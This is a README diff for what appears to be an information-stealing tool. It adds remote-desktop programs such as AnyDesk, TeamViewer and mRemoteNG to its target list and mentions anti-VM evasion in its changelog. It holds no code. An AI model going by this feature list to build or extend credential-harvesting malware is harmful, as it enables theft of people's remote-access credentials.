@@ -63,6 +63,16 @@
 - Smart FTP
 - ⏳ Working on (Putty, Telnet)
 
+💿 Rdp Sessions
+- Microsoft RDP
+- mRemoteNG
+- Remote Desktop Manager
+- AnyDesk
+- TeamViewer
+- VNC Clients
+- Parallels Access
+- Chrome Remote Desktop
+
 ✉️ Emails
 - ThunderBird
 - BackupMailBird
@@ -141,6 +151,7 @@
 - V1.3.6 Improved AntiVM, Roblox and added more function to get more computer informations & fixed small code errors
 - V1.3.7 Added +12 Minecraft Clients
 - V1.3.8 Added SmartFTP
+- V1.3.9 Small code fixes + Added +8 Rdp Sessions
 ```
 
 👤 Author
